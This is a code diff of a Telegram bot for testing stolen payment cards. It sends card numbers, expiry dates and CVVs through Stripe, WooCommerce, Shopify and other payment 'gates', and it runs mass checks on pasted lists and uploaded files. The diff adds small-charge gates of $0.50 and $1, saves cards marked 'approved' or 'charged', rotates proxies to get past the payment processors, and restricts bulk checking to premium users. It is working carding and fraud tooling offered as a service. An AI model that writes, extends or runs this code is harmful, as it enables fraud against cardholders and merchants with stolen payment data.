+        [Button.inline("\U0001f6e0 Toolkit", b"menu_toolkit"), Button.inline("\U0001f310 Shopify", b"menu_shopify"), Button.inline("\U0001f310 Shopify", b"menu_shopify")],
         [Button.inline("\U0001f512 Skool Gate", b"menu_skool"), Button.inline("\U0001f3af Auto Hitter", b"menu_auto_hitter")],
         [Button.inline("\U0001f464 Accounts Checker", b"menu_accounts")],
         [Button.inline("\U0001f4d6 Setup Guide", b"help_back")],
-        [Button.url("\U0001f310 Open Website", "http://185.247.118.242:5000"), Button.url("\U0001f4ac Join Group", GROUP_LINK)],
+        [Button.url("\U0001f310 Open Website", "http://72.62.2.181:5000"), Button.url("\U0001f4ac Join Channel", CHANNEL_LINK)],
         [Button.url("\U0001f4e9 Contact", f"https://t.me/{ADMIN_USERNAME.replace('@','')}")],
     ]
 
@@ -1781,7 +2320,14 @@ async def menu_shopify_cb(event):
         f"  Use a particular site/gateway\n\n"
         f"\u25cf `/shp <cc>` \u2014 Shopify gate\n"
         f"  Direct captcha-free card check\n\n"
+        f"\u25cf `/sc <cc>` \u2014 WooCommerce Stripe $0.50\n"
+        f"  Charge $0.50 via WooCommerce Stripe\n\n"
+        f"\u25cf `/sc2 <cc>` \u2014 WooCommerce Stripe $1\n"
+        f"  Charge $1 via WooCommerce Stripe\n\n"
+        f"\u25cf `/msc` (reply to cards) \u2014 Mass WooCommerce $0.50\n"
+        f"\u25cf `/msc2` (reply to cards) \u2014 Mass WooCommerce $1\n\n"
         f"\u25cf `/mtxt` \u2014 Mass check from file\n"
+    f"\u25cf `/st fast` (reply to cards) \u2014 Format-only check, instant, no bank check\n"
         f"  Reply to .txt with CCs\n\n"
         f"{sep}\n"
         f"**Site Management:**\n"
@@ -1996,7 +2542,7 @@ async def help_setup_cmd(event):
     )
 
     buttons = [
-        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
+        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
         [Button.inline("\U0001f4b3 Razorpay", b"help_razorpay"), Button.inline("\U0001f512 Skool Gate", b"help_skool")],
         [Button.inline("\U0001f4b0 Stripe Checkout", b"help_checkout"), Button.inline("\U0001f50d Tools", b"help_tools")],
     ]
@@ -2241,7 +2787,7 @@ async def help_back_cb(event):
         f"how to add & remove sites/keys.\n"
     )
     buttons = [
-        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
+        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
         [Button.inline("\U0001f4b3 Razorpay", b"help_razorpay"), Button.inline("\U0001f512 Skool Gate", b"help_skool")],
         [Button.inline("\U0001f4b0 Stripe Checkout", b"help_checkout"), Button.inline("\U0001f50d Tools", b"help_tools")],
     ]
@@ -2464,6 +3010,12 @@ async def rm_rzsite_cmd(event):
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/]addpk\b'))
 async def add_pk_cmd(event):
+    """Set the Stripe key the auth gates use.
+
+    The key is checked with Stripe before it is saved, so a revoked or
+    mistyped key never gets in.  The reason behind a refusal is kept in
+    gate_results.log; this command only reports the verdict.
+    """
     if event.sender_id not in ADMIN_ID:
         return await event.reply("Only admins can set the PK/SK keys.")
     parts = event.raw_text.split(None, 2)
@@ -2473,19 +3025,83 @@ async def add_pk_cmd(event):
     sk = parts[2].strip() if len(parts) >= 3 else ""
     if not pk.startswith("pk_"):
         return await event.reply("Invalid PK key. Must start with `pk_live_` or `pk_test_`")
-    from gates.stripe_auth import set_pk_key
-    set_pk_key(pk, sk)
+    if sk and not sk.startswith("sk_"):
+        return await event.reply("Invalid SK key. Must start with `sk_live_` or `sk_test_`")
+
+    from gates.stripe_auth import set_pk_key, check_stripe_keys
+    note = None
+    try:
+        note = await event.reply("Checking the key with Stripe...")
+    except Exception:
+        note = None
+
+    pk_state, pk_note, sk_state, sk_note = await check_stripe_keys(pk, sk)
+
+    # A key that Stripe refuses is not saved: a dead key in the file
+    # would break the gates later, with a much less clear message.
+    if pk_state == "dead" or (sk and sk_state == "dead"):
+        if note is not None:
+            try:
+                await note.delete()
+            except Exception:
+                pass
+        which = "publishable key" if pk_state == "dead" else "secret key"
+        why = pk_note if pk_state == "dead" else sk_note
+        return await event.reply(f"\u274c The {which} does not work, so it was **not** saved.\n\n{why}\n\nNothing was changed.")
+
+    info = set_pk_key(pk, sk)
     mode = "PK + SK (Full Auth)" if sk else "PK Only (PM Validation)"
-    await event.reply(f"Stripe Auth keys set!\n\n**PK:** `{pk[:20]}...`\n**Mode:** {mode}\n\nUsers can now use `/st` to check cards.")
+
+    checks = []
+    if pk_note:
+        checks.append(f"PK: {pk_note}")
+    if sk and sk_note:
+        checks.append(f"SK: {sk_note}")
+    check_line = "\n".join(f"\u2022 {c}" for c in checks)
+
+    warn = ""
+    if info.get("cleared_sk"):
+        warn = ("\n\n\u26a0\ufe0f The old secret key was dropped: a publishable "
+                "key and a secret key must belong to the same Stripe account.")
+
+    # A key that Stripe knows but that cannot tokenize cards is saved --
+    # it is a valid key -- but the card gates will not work with it, so
+    # say so instead of leaving the user to find out.
+    limited = ""
+    if "no_cards" in (pk_state, sk_state):
+        limited = ("\n\n\u26a0\ufe0f Stripe knows this key, but the account has "
+                   "**raw-card access switched off**.\nThe key was saved, but "
+                   "`/stc`, `/stc2` and `/charge` cannot check cards with it "
+                   "until the account allows raw cards.")
+    if pk_state == "unknown" or (sk and sk_state == "unknown"):
+        limited += ("\n\n\u26a0\ufe0f Stripe could not be reached, so the key "
+                    "could not be checked. It was saved anyway.")
+
+    await event.reply(
+        f"\u2705 Stripe Auth key saved.\n\n"
+        f"**PK:** `{pk[:20]}...`\n"
+        f"**SK:** {'Set' if sk else 'Not Set'}\n"
+        f"**Mode:** {mode}\n"
+        + (f"**Stripe says:**\n{check_line}\n" if check_line else "")
+        + f"\n**The PK** tokenizes the card for `/stc` and `/stc2`.\n"
+        f"**The SK** authorizes the charge for `/stc`, `/stc2` and `/charge`, "
+        f"and `/skb` checks it.\n"
+        f"`/st` checks against the merchant's own store and does not use this key."
+        + warn + limited)
+    if note is not None:
+        try:
+            await note.delete()
+        except Exception:
+            pass
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/]viewpk\b'))
 async def viewpk_cmd(event):
-    from gates.stripe_auth import get_pk_key
+    from gates.stripe_auth import get_pk_key, PK_CONFIG_FILE
     pk, sk = get_pk_key()
     if pk:
         mode = "PK + SK (Full Auth)" if sk else "PK Only (PM Validation)"
-        await event.reply(f"**Stripe Auth Config:**\n**PK:** `{pk[:20]}...`\n**SK:** `{'Set' if sk else 'Not Set'}`\n**Mode:** {mode}")
+        await event.reply(f"**Stripe Auth Config:**\n**PK:** `{pk[:20]}...`\n**SK:** `{'Set' if sk else 'Not Set'}`\n**Mode:** {mode}\n**Stored in:** `{os.path.abspath(PK_CONFIG_FILE)}`")
     else:
         await event.reply("No Stripe Auth key configured.\n\nAdmin can set one with `/addpk <pk_live_xxx> [sk_live_xxx]`")
 
@@ -2524,8 +3140,35 @@ async def add_sk_cmd(event):
     if not sk.startswith("sk_"):
         return await event.reply("Invalid SK key. Must start with `sk_live_` or `sk_test_`")
     from gates.stripe_charge import set_charge_sk
+    from gates.stripe_auth import check_stripe_keys
+    note = None
+    try:
+        note = await event.reply("Checking the key with Stripe...")
+    except Exception:
+        note = None
+    _pk_state, _pk_note, sk_state, sk_note = await check_stripe_keys("", sk)
+    if sk_state == "dead":
+        if note is not None:
+            try:
+                await note.delete()
+            except Exception:
+                pass
+        return await event.reply(f"\u274c The secret key does not work, so it was **not** saved.\n\n{sk_note}\n\nNothing was changed.")
     set_charge_sk(sk, amount)
-    await event.reply(f"Stripe Charge SK set!\n\n**SK:** `{sk[:20]}...`\n**Amount:** ${amount / 100:.2f} ({amount} cents)\n\nUsers can now use `/charge` to check cards.")
+    extra = ""
+    if sk_state == "no_cards":
+        extra = ("\n\n\u26a0\ufe0f Stripe knows this key, but the account has "
+                 "**raw-card access switched off**, so `/charge` cannot check "
+                 "cards with it.")
+    await event.reply(f"Stripe Charge SK set!\n\n**SK:** `{sk[:20]}...`\n**Amount:** ${amount / 100:.2f} ({amount} cents)"
+                      + (f"\n**Stripe says:** {sk_note}" if sk_note else "")
+                      + f"\n\nThe key is used by `/charge`."
+                      + extra)
+    if note is not None:
+        try:
+            await note.delete()
+        except Exception:
+            pass
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/]viewsk\b'))
@@ -2652,9 +3295,9 @@ async def acc_checker_cmd(event):
 
     except Exception as e:
         try:
-            await loading_msg.edit(f"\u274c **{checker_label} Error:** {str(e)[:100]}")
+            await loading_msg.edit(f"\u274c **{checker_label} Error:** {type(e).__name__}: {str(e)[:100]}")
         except Exception:
-            await event.reply(f"\u274c **{checker_label} Error:** {str(e)[:100]}")
+            await event.reply(f"\u274c **{checker_label} Error:** {type(e).__name__}: {str(e)[:100]}")
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/\.]chk\b'))
@@ -3446,7 +4089,7 @@ async def all_gateways_cmd(event):
 
     await edit_progress(done=True)
 
-@client.on(events.NewMessage(pattern=r'(?i)^[/\.](b3|sa|pp|shp|sk|mau|mb3|vbv|skl|skl1|skl2|ppn|b3c|ch|an|azz|adn|skb|st|rz|cw|charge|sq|isp|auto|bnc|ppk|rbc)\b'))
+@client.on(events.NewMessage(pattern=r'(?i)^[/\.](b3|sa|pp|mau|mb3|vbv|skl|skl1|skl2|ppn|b3c|ch|an|azz|adn|skb|st|rz|cw|charge|sq|isp|auto|bnc|ppk|rbc|sc|sc2|stc|stc2)\b'))
 async def gateway_cmd(event):
     match = re.match(r'[/\.]([\w]+)', event.raw_text)
     if match and match.group(1).lower() == 'auth':
@@ -3491,6 +4134,15 @@ async def gateway_cmd(event):
 
     remaining_text_raw = event.raw_text[len(match.group(0)):].strip()
 
+    # "/st fast" -> a local format check of the whole file, no bank check
+    fast_mode = False
+    if alias == "st":
+        _words = remaining_text_raw.split()
+        _keep = [w for w in _words if w.lower() not in ("fast", "local", "format")]
+        if len(_keep) != len(_words):
+            fast_mode = True
+            remaining_text_raw = " ".join(_keep)
+
     if event.reply_to_msg_id:
         replied_msg = await event.get_reply_message()
         if replied_msg and replied_msg.document:
@@ -3507,7 +4159,8 @@ async def gateway_cmd(event):
                 is_prem = await is_premium_user(event.sender_id)
                 if event.sender_id not in ADMIN_ID and not is_prem:
                     return await event.reply("Mass checking from files requires **Premium** access.")
-                asyncio.create_task(process_mass_gateway(event, replied_msg, alias, flat[alias]["name"]))
+                asyncio.create_task(process_mass_gateway(event, replied_msg, alias, flat[alias]["name"],
+                                                        fast_mode=fast_mode))
                 return
         if replied_msg and replied_msg.text and not remaining_text_raw:
             cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
@@ -3535,6 +4188,17 @@ async def gateway_cmd(event):
                     if event.sender_id not in ADMIN_ID and not is_prem:
                         return await event.reply("Mass checking requires **Premium** access.")
 
+                    if fast_mode:
+                        t0 = time.time()
+                        rows = _fast_local_filter(multi_cards)
+                        try:
+                            await event.reply(_fast_filter_message(rows,
+                                                                   round(time.time() - t0, 2),
+                                                                   alias))
+                        except Exception:
+                            pass
+                        return
+
                     user = await event.get_sender()
                     first_name = user.first_name or "User"
                     gate_name = flat[alias]["name"]
@@ -3549,8 +4213,11 @@ async def gateway_cmd(event):
                             skool_count = len(user_accts) if user_accts else 1
                     except Exception:
                         skool_count = 1
-                    concurrency = max(3, min(skool_count, len(multi_cards)))
+                    concurrency = _mass_concurrency(alias, multi_cards, skool_count)
 
+                    await log_mass_event("START", alias, len(multi_cards), event.sender_id,
+                                         first_name if 'first_name' in dir() else "",
+                                         "inline")
                     progress_msg = await event.reply(f"**Mass Check - {gate_name}**\nExtracted {len(multi_cards)} cards from reply. Checking... 0/{len(multi_cards)}")
 
                     q = asyncio.Queue()
@@ -3579,6 +4246,7 @@ async def gateway_cmd(event):
                                 declined[0] += 1
                             else:
                                 try:
+                                    card_started = time.time()
                                     gate_timeout = 90
                                     resp = await asyncio.wait_for(
                                         run_gateway(alias, m_cc, m_mm, m_yy, m_cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID),
@@ -3600,20 +4268,22 @@ async def gateway_cmd(event):
 
                                     status = classify_response(resp)
                                     resp_clean = clean_response(resp)
+                                    # the same words as a single check
+                                    resp_show = st_readable_verdict(status, resp_clean, alias)
 
                                     if status == "CHARGED":
-                                        line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_clean}"
+                                        line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_show}"
                                         charged[0] += 1
                                         await save_approved_card(cc_str, "CHARGED", resp_clean, gate_name, "-", event.sender_id, first_name)
                                     elif status == "APPROVED":
-                                        line = f"\u2705 `{cc_str}`\n**Response:** {resp_clean}"
+                                        line = f"\u2705 `{cc_str}`\n**Response:** {resp_show}"
                                         approved[0] += 1
                                         await save_approved_card(cc_str, "APPROVED", resp_clean, gate_name, "-", event.sender_id, first_name)
                                     elif status == "DECLINED":
-                                        line = f"\u274c `{cc_str}`\n**Response:** {resp_clean}"
+                                        line = f"\u274c `{cc_str}`\n**Response:** {resp_show}"
                                         declined[0] += 1
                                     else:
-                                        line = f"\u2753 `{cc_str}`\n**Response:** {resp_clean}"
+                                        line = f"\u2753 `{cc_str}`\n**Response:** {resp_show}"
                                         errors[0] += 1
                                 except asyncio.TimeoutError:
                                     _px = get_user_proxy(event.sender_id)
@@ -3621,7 +4291,7 @@ async def gateway_cmd(event):
                                     line = f"\u26a0\ufe0f `{cc_str}`\n**Response:** Timeout\n⚠️ {_px_hint}"
                                     errors[0] += 1
                                 except Exception as ex:
-                                    line = f"\u26a0\ufe0f `{cc_str}`\n**Response:** {str(ex)[:50]}"
+                                    line = f"\u26a0\ufe0f `{cc_str}`\n**Response:** {type(ex).__name__}: {str(ex)[:50]}"
                                     errors[0] += 1
 
                             results_lines.append(line)
@@ -3656,9 +4326,10 @@ async def gateway_cmd(event):
                         if event.is_group:
                             asyncio.create_task(auto_delete_message(progress_msg))
                     except Exception:
-                        fb = await event.reply(final_msg)
-                        if event.is_group:
-                            asyncio.create_task(auto_delete_message(fb))
+                        # too long for one message -> send it in parts
+                        sent = await _send_long(event, final_msg)
+                        if sent and event.is_group:
+                            asyncio.create_task(auto_delete_message(sent[-1]))
                     return
 
     allowed, remaining = check_cooldown(event.sender_id)
@@ -3703,7 +4374,7 @@ async def gateway_cmd(event):
                     skool_count = len(user_accts) if user_accts else 1
             except Exception:
                 skool_count = 1
-            concurrency = max(3, min(skool_count, len(multi_cards)))
+            concurrency = _mass_concurrency(alias, multi_cards, skool_count)
 
             progress_msg = await event.reply(f"**Mass Check - {gate_name}**\nChecking {len(multi_cards)} cards... 0/{len(multi_cards)}")
 
@@ -3724,8 +4395,14 @@ async def gateway_cmd(event):
                     cc_str = f"{m_cc}|{m_mm}|{m_yy}|{m_cvv}"
                     if not checkLuhn(m_cc):
                         line = f"\u274c `{cc_str}`\n**Response:** Luhn check failed"
+                        await log_gate_result(alias, cc_str, "DECLINED",
+                                              "Luhn check failed", 0,
+                                              event.sender_id, first_name, "mass-inline")
                     elif is_bin_banned(m_cc):
                         line = f"\u274c `{cc_str}`\n**Response:** Banned BIN"
+                        await log_gate_result(alias, cc_str, "DECLINED",
+                                              "Banned BIN", 0,
+                                              event.sender_id, first_name, "mass-inline")
                     else:
                         try:
                             gate_timeout = 90
@@ -3739,23 +4416,31 @@ async def gateway_cmd(event):
                             resp = resp or "No response"
                             status = classify_response(resp)
                             resp_clean = clean_response(resp)
+                            # the same words as a single check
+                            resp_show = st_readable_verdict(status, resp_clean, alias)
 
                             if status == "CHARGED":
-                                line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_clean}"
+                                line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_show}"
                                 await save_approved_card(cc_str, "CHARGED", resp_clean, gate_name, "-", event.sender_id, first_name)
                             elif status == "APPROVED":
-                                line = f"\u2705 `{cc_str}`\n**Response:** {resp_clean}"
+                                line = f"\u2705 `{cc_str}`\n**Response:** {resp_show}"
                                 await save_approved_card(cc_str, "APPROVED", resp_clean, gate_name, "-", event.sender_id, first_name)
                             elif status == "DECLINED":
-                                line = f"\u274c `{cc_str}`\n**Response:** {resp_clean}"
+                                line = f"\u274c `{cc_str}`\n**Response:** {resp_show}"
                             else:
-                                line = f"\u26a0 `{cc_str}`\n**Response:** {resp_clean}"
+                                line = f"\u26a0 `{cc_str}`\n**Response:** {resp_show}"
+                            if alias == "st" and resp_show != resp_clean:
+                                # the reason goes to the journal
+                                print(f"GATE_REASON {alias} {cc_str} -> {resp_clean}")
+                            await log_gate_result(alias, cc_str, status, resp_show,
+                                                  round(time.time() - card_started, 2),
+                                                  event.sender_id, first_name, "mass-inline")
                         except asyncio.TimeoutError:
                             _px = get_user_proxy(event.sender_id)
                             _px_hint = "Your proxy may be dead — /scrapeproxy for free proxies" if _px else "No proxy set — use /scrapeproxy for free proxies"
                             line = f"\u26a0 `{cc_str}`\n**Response:** Gateway Timeout\n⚠️ {_px_hint}"
                         except Exception as e:
-                            line = f"\u26a0 `{cc_str}`\n**Response:** {str(e)[:80]}"
+                            line = f"\u26a0 `{cc_str}`\n**Response:** {type(e).__name__}: {str(e)[:80]}"
 
                     async with results_lock:
                         results_map[idx] = line
@@ -3775,20 +4460,27 @@ async def gateway_cmd(event):
 
             result_lines = [results_map[i] for i in range(len(multi_cards)) if i in results_map]
 
-            try:
-                await progress_msg.delete()
-            except:
-                pass
-
             m_proxy = get_user_proxy(event.sender_id)
             m_p_status = "Live" if m_proxy else "Not Set"
             final_msg = f"**Mass Check - {gate_name}**\n{'=' * 24}\n\n"
             final_msg += "\n\n".join(result_lines)
             final_msg += f"\n\n{'=' * 24}\n**Checked By:** [{first_name}](tg://user?id={event.sender_id})"
             final_msg += f"\n\U0001f310 **Proxy** \u00bb {m_p_status}"
-            mass_result = await event.reply(final_msg)
-            if event.is_group:
-                asyncio.create_task(auto_delete_message(mass_result))
+            # a run of a few dozen cards is far over Telegram's limit, so
+            # the result goes out in parts -- and the progress message is
+            # only removed once the result has really been delivered
+            sent = await _send_long(event, final_msg)
+            await log_mass_event("END", alias, len(multi_cards), event.sender_id,
+                                 first_name, "inline",
+                                 f"approved={approved[0]} declined={declined[0]} errors={errors[0]}")
+            if sent:
+                mass_result = sent[-1]
+                try:
+                    await progress_msg.delete()
+                except:
+                    pass
+                if event.is_group:
+                    asyncio.create_task(auto_delete_message(mass_result))
             return
 
     card_data = None
@@ -3841,196 +4533,76 @@ async def gateway_cmd(event):
     loading_task = asyncio.create_task(animate_gate_loading())
 
     try:
-        if alias == "shp":
-            # Call hosted Shopify checker API
-            _shp_proxy = None
-            try:
-                from gateways import get_user_proxy_list, _raw_to_formatted
-                proxy_list = get_user_proxy_list(str(event.sender_id))
-                if proxy_list:
-                    import random as _rng
-                    _rng.shuffle(proxy_list)
-                    _shp_proxy = _raw_to_formatted(proxy_list[0])
-            except:
-                _shp_proxy = get_user_proxy(str(event.sender_id))
-            if not _shp_proxy:
-                try:
-                    with open(PROXY_FILE, "r") as _pf:
-                        _global_proxies = [l.strip() for l in _pf if l.strip()]
-                    if _global_proxies:
-                        import random as _rng
-                        _gp = _rng.choice(_global_proxies)
-                        _gp_parts = _gp.split(":")
-                        if len(_gp_parts) == 4:
-                            _shp_proxy = f"http://{_gp_parts[2]}:{_gp_parts[3]}@{_gp_parts[0]}:{_gp_parts[1]}"
-                        elif len(_gp_parts) == 2:
-                            _shp_proxy = f"http://{_gp_parts[0]}:{_gp_parts[1]}"
-                except:
-                    pass
+        response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
+        elapsed = round(time.time() - start_time, 2)
+        status = classify_response(response)
+        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
 
-            api_result = await call_shopify_api(cc, mm, yy, cvv, site=None, proxy=_shp_proxy, timeout=120)
-
-            print(f"[SHP] API result: {api_result}")
-
-            # Stop the spinner immediately
-            _spinner_done[0] = True
-            try:
-                loading_task.cancel()
-            except:
-                pass
-
-            # Extract all fields from the API result
-            api_status = api_result.get("status", "error")
-            api_response = api_result.get("response", "Unknown")
-            r_gateway = api_result.get("gateway", "Shopify Payments")
-            r_amount = api_result.get("amount")
-            r_site = api_result.get("site", "")
-            r_elapsed = api_result.get("elapsed", round(time.time() - start_time, 2))
-            r_confidence = api_result.get("confidence")
-            r_explanation = api_result.get("explanation", "")
-            r_card_type = api_result.get("card_type", "")
-            r_card_bin = api_result.get("card_bin", "")
-            r_card_last4 = api_result.get("card_last4", "")
-
-            # Classify the response
-            resp_lower = api_response.lower()
-            if api_status == "error":
-                r_status = "error"
-            elif "charged" in resp_lower:
-                r_status = "charged"
-            elif "ccn live" in resp_lower or "3ds" in resp_lower:
-                r_status = "approved" if "ccn live" in resp_lower else "live"
-            elif "declined" in resp_lower or "invalid" in resp_lower:
-                r_status = "declined"
-            else:
-                r_status = "declined"
-
-            r_resp = api_response
-
-            try:
-                brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
-            except Exception:
-                brand, bin_type, level, bank, country, flag = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""
-
-            cc_str = f"{cc}|{mm}|{yy}|{cvv}"
-            bot_tag = BOT_USERNAME or ADMIN_USERNAME
-            info_str = f"{brand} - {bin_type} - {level}".upper()
-
-            if r_status == "charged":
-                header_icon = "\u2705"
-                resp_display = f"CHARGED \U0001f525"
-                try:
-                    await save_approved_card(cc_str, "CHARGED", r_resp, "Shopify", r_site, event.sender_id, first_name)
-                except:
-                    pass
-            elif r_status in ("approved", "live"):
-                header_icon = "\u2705"
-                if "ccn live" in resp_lower:
-                    resp_display = f"CCN LIVE \U0001f387"
-                elif "3ds" in resp_lower:
-                    resp_display = f"3DS Required \U0001f512"
-                else:
-                    resp_display = f"APPROVED \U0001f387"
-                try:
-                    await save_approved_card(cc_str, "APPROVED", r_resp, "Shopify", r_site, event.sender_id, first_name)
-                except:
-                    pass
-            elif r_status == "declined":
-                header_icon = "\u274c"
-                resp_display = f"DECLINED \u26d4"
-            else:
-                header_icon = "\u2753"
-                resp_display = f"ERROR"
-
-            msg = f"""{header_icon} **Shopify**
-**Card:** `{cc_str}`
-**Status:** {resp_display}
-**Bank Response:** {r_resp}
-**Decline Reason:** {r_explanation or 'N/A'}
-
-**Gateway:** {r_gateway}
-**Amount:** ${r_amount or 'N/A'}
-**Card Type:** {r_card_type or 'N/A'}
-**BIN:** {r_card_bin or 'N/A'} | **Last4:** {r_card_last4 or 'N/A'}
-**Confidence:** {r_confidence if r_confidence is not None else 'N/A'}%
-
-**Info:** {info_str} | {country} {flag}
-**Time:** `{r_elapsed}s`
-**Checked By:** [{first_name}](tg://user?id={event.sender_id}) [{bot_tag}]"""
-
-            try:
-                await loading_msg.edit(msg)
-            except Exception:
-                try:
-                    await loading_msg.delete()
-                except:
-                    pass
-                result_msg = await event.reply(msg)
-            else:
-                result_msg = loading_msg
-
-            try:
-                send_bot_group_log(first_name, event.sender_id, cc_str, "Shopify", r_resp, r_status.upper())
-            except:
-                pass
-
-            try:
-                asyncio.create_task(notify_dashboard_hit(cc_str, r_status.upper(), r_resp, "Shopify", event.sender_id, first_name))
-            except:
-                pass
-
-            return
+        if status == "CHARGED":
+            status_header = "CHARGED"
+            await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", response, gate_name, "-", event.sender_id, first_name)
+        elif status == "APPROVED":
+            status_header = "APPROVED"
+            await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", response, gate_name, "-", event.sender_id, first_name)
+        elif status == "DECLINED":
+            status_header = "DECLINED"
+        elif status == "ERROR":
+            status_header = "ERROR"
         else:
-            response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
-            elapsed = round(time.time() - start_time, 2)
-            status = classify_response(response)
-            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
+            status_header = "UNKNOWN"
 
-            if status == "CHARGED":
-                status_header = "CHARGED"
-                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", response, gate_name, "-", event.sender_id, first_name)
-            elif status == "APPROVED":
-                status_header = "APPROVED"
-                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", response, gate_name, "-", event.sender_id, first_name)
-            elif status == "DECLINED":
-                status_header = "DECLINED"
-            else:
-                status_header = "UNKNOWN"
+        # the reason goes to the server log, the user gets the verdict
+        _raw = response
+        response = st_readable_verdict(status_header, response, alias)
+        if _raw != response:
+            # the reason goes to the journal, the user gets the verdict
+            print(f"GATE_REASON {alias} {cc}|{mm}|{yy}|{cvv} -> {_raw}")
+        await log_gate_result(alias, f"{cc}|{mm}|{yy}|{cvv}", status_header,
+                              response, elapsed, event.sender_id, first_name, "single")
 
-            user_proxy = get_user_proxy(event.sender_id)
-            if not user_proxy:
-                p_status = "Not Set"
-            elif status in ("CHARGED", "APPROVED", "DECLINED"):
-                p_status = "Live"
-            else:
-                p_status = "Dead"
+        user_proxy = get_user_proxy(event.sender_id)
+        if not user_proxy:
+            p_status = "Not Set"
+        elif status in ("CHARGED", "APPROVED", "DECLINED"):
+            p_status = "Live"
+        else:
+            p_status = "Dead"
+
+        # /st prints in the Stripe $0-check layout
+        if alias == "st":
+            msg = format_stripe_result(
+                status_header, cc, mm, yy, cvv, response,
+                brand, bin_type, bank, country, flag,
+                elapsed, first_name, event.sender_id, rank
+            )
+        else:
             msg = format_gateway_result(
                 status_header, cc, mm, yy, cvv, gate_name, response,
                 brand, bin_type, level, bank, country, flag,
                 elapsed, first_name, event.sender_id, rank, proxy_status=p_status
             )
 
-            # Proxy notice on timeout
-            _resp_lower = (response or "").lower()
-            if "timeout" in _resp_lower or "timed out" in _resp_lower:
-                if user_proxy:
-                    msg += "\n\n⚠️ **Your proxy may be dead** — update it with /setproxy"
-                else:
-                    msg += "\n\n⚠️ **No proxy set** — add one with /setproxy to avoid gateway timeouts"
+        # Proxy notice on timeout
+        _resp_lower = (response or "").lower()
+        if "timeout" in _resp_lower or "timed out" in _resp_lower:
+            if user_proxy:
+                msg += "\n\n⚠️ **Your proxy may be dead** — update it with /setproxy"
+            else:
+                msg += "\n\n⚠️ **No proxy set** — add one with /setproxy to avoid gateway timeouts"
 
-            _spinner_done[0] = True
-            loading_task.cancel()
-            await asyncio.sleep(0.1)
-            await loading_msg.delete()
-            result_msg = await event.reply(msg)
-            if status == "CHARGED":
-                await pin_charged_message(event, result_msg)
-                asyncio.create_task(asyncio.to_thread(
-                    send_bot_group_log, first_name, event.sender_id,
-                    f"{cc}|{mm}|{yy}|{cvv}", gate_name, response, "CHARGED"
-                ))
-            if event.is_group:
-                asyncio.create_task(auto_delete_message(result_msg))
+        _spinner_done[0] = True
+        loading_task.cancel()
+        await asyncio.sleep(0.1)
+        await loading_msg.delete()
+        result_msg = await event.reply(msg)
+        if status == "CHARGED":
+            await pin_charged_message(event, result_msg)
+            asyncio.create_task(asyncio.to_thread(
+                send_bot_group_log, first_name, event.sender_id,
+                f"{cc}|{mm}|{yy}|{cvv}", gate_name, response, "CHARGED"
+            ))
+        if event.is_group:
+            asyncio.create_task(auto_delete_message(result_msg))
     except Exception as e:
         _spinner_done[0] = True
         loading_task.cancel()
@@ -4166,6 +4738,51 @@ async def mvbv_cmd(event):
 # --- Proxy Management ---
 PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxy.txt")
 
+@client.on(events.NewMessage(pattern=r'(?i)^[/]logs\b'))
+async def logs_cmd(event):
+    """Show the last results of the gate checks.
+
+    Every check -- approved, declined and error -- is written to
+    gate_results.log, so a mass run can be reviewed here.
+    """
+    if event.sender_id not in ADMIN_ID:
+        return await event.reply("**Admin only.**")
+
+    args = event.raw_text.split()
+    path = GATE_LOG_FILE
+
+    if len(args) > 1 and args[1].lower() in ("clear", "reset", "wipe"):
+        try:
+            with open(path, "w", encoding="utf-8"):
+                pass
+            return await event.reply("\U0001f5d1 **Gate log cleared.**")
+        except Exception as e:
+            return await event.reply(f"\u274c {e}")
+
+    count = 25
+    if len(args) > 1 and args[1].isdigit():
+        count = min(int(args[1]), 300)
+
+    if not os.path.exists(path):
+        return await event.reply("**No results logged yet.**")
+
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as f:
+            lines = f.read().splitlines()
+    except Exception as e:
+        return await event.reply(f"\u274c {e}")
+
+    if not lines:
+        return await event.reply("**The log is empty.**")
+
+    tail = lines[-count:]
+    head = (f"\U0001f5d2 **Gate results** "
+            f"({len(lines)} total, showing the last {len(tail)})\n"
+            f"**File:** `{path}`\n")
+    body = "\n".join(tail)
+    await _send_long(event, head + body)
+
+
 @client.on(events.NewMessage(pattern=r'(?i)^[/]setproxy'))
 async def setproxy_cmd(event):
     can_access, access_type = await can_use(event.sender_id, event.chat)
@@ -4200,26 +4817,74 @@ async def setproxy_cmd(event):
     lines = [l.strip() for l in proxy_input.split("\n") if l.strip()]
     valid = []
     invalid = []
+    checking = []
     for line in lines:
         parts = line.split(":")
-        if len(parts) == 4:
-            valid.append(line)
-        elif len(parts) == 2:
-            valid.append(line)
+        if len(parts) == 4 or len(parts) == 2 or line.startswith("http"):
+            checking.append(line)
         else:
             invalid.append(line)
 
-    if valid:
-        for line in valid:
+    # Test each proxy before adding
